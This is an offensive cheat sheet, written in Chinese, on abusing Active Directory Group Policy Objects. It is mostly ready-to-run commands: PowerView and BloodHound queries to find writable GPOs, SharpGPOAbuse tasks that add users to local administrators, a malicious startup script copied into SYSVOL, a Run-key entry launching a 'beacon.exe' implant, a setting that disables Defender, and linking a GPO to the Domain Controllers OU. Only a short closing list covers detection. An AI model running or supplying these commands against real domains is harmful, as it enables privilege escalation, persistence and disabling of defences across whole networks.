# GPO 滥用速查

## §0 GPO枚举

**查找可写GPO**
```
# PowerView — 查当前用户能编辑的GPO
Get-DomainGPO | Get-DomainObjectAcl -ResolveGUIDs | ? {$_.ActiveDirectoryRights -match 'WriteProperty|WriteDacl|GenericAll|GenericWrite' -and $_.SecurityIdentifier -match 'S-1-5-21-.*-\d{4,}$'}

# 直接按SID过滤
Get-DomainGPO | Get-DomainObjectAcl -ResolveGUIDs | ? {$_.SecurityIdentifier -eq (Get-DomainUser $env:USERNAME).objectsid}

# BloodHound Cypher
MATCH (u:User {name:"USER@DOMAIN"})-[:GenericAll|GenericWrite|WriteDacl|WriteOwner]->(g:GPO) RETURN g.name,g.gpcpath
```

**查GPO链接到哪些OU**
```
Get-DomainGPO -Identity "TARGET-GPO-GUID" | select displayname,gpcfilesyspath
Get-DomainOU | ? {$_.gplink -match "TARGET-GPO-GUID"} | select distinguishedname
```

## §1 即时任务注入（Scheduled Task）

**前置**：对GPO有WriteProperty权限
```
# SharpGPOAbuse — 添加即时任务（所有链接OU内的机器刷新后执行）
SharpGPOAbuse.exe --AddComputerTask --TaskName "Update" --Author "NT AUTHORITY\SYSTEM" --Command "cmd.exe" --Arguments "/c net localgroup administrators DOMAIN\user /add" --GPOName "TARGET-GPO"

# 强制刷新（目标机器上，或通过WMI远程触发）
gpupdate /force
Invoke-GPUpdate -Computer TARGET -Force
```

## §2 启动脚本注入（Startup Script）

**前置**：GPO的gpcfilesyspath可写
```
# 1. 定位SYSVOL路径
Get-DomainGPO -Identity "TARGET-GPO-GUID" | select gpcfilesyspath
# → \\domain.com\SysVol\domain.com\Policies\{GUID}

# 2. 写恶意脚本到 Machine\Scripts\Startup\
copy payload.bat \\domain.com\SysVol\domain.com\Policies\{GUID}\Machine\Scripts\Startup\update.bat

# 3. 修改scripts.ini（或psscripts.ini）
# Machine\Scripts\scripts.ini:
# [Startup]
# 0CmdLine=update.bat
# 0Parameters=
```

## §3 受限组修改（Restricted Groups）

**效果**：GPO刷新后，目标机器本地管理员组被强制设置为指定成员
```
SharpGPOAbuse.exe --AddLocalAdmin --UserAccount "DOMAIN\user" --GPOName "TARGET-GPO"

# 手动方式：编辑 Machine\Microsoft\Windows NT\SecEdit\GptTmpl.inf
# [Group Membership]
# *S-1-5-32-544__Members = *S-1-5-21-xxx-yyy-zzz-USER_RID
```

## §4 注册表策略注入

**Run键自启动**
```
SharpGPOAbuse.exe --AddRegistryKey --RegistryKey "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" --ValueName "Updater" --Value "C:\Windows\Temp\beacon.exe" --GPOName "TARGET-GPO"
```

**禁用Defender（配合其他手法）**
```
# GptTmpl.inf 或直接改Registry.pol
# HKLM\SOFTWARE\Policies\Microsoft\Windows Defender → DisableAntiSpyware = 1
```

## §5 GPO链接劫持

**场景**：有WriteDacl权限可以把GPO链接到高价值OU
```
# PowerView — 把GPO链接到Domain Controllers OU
Set-DomainObject -Identity "OU=Domain Controllers,DC=domain,DC=com" -Set @{gplink="[LDAP://cn={GPO-GUID},cn=policies,cn=system,DC=domain,DC=com;0]"}
```

**检测要点**
- Event 5136（目录服务变更）— 监控gplink/gPCFileSysPath修改
- SYSVOL写入审计
- GPO版本号(versionNumber)异常变化
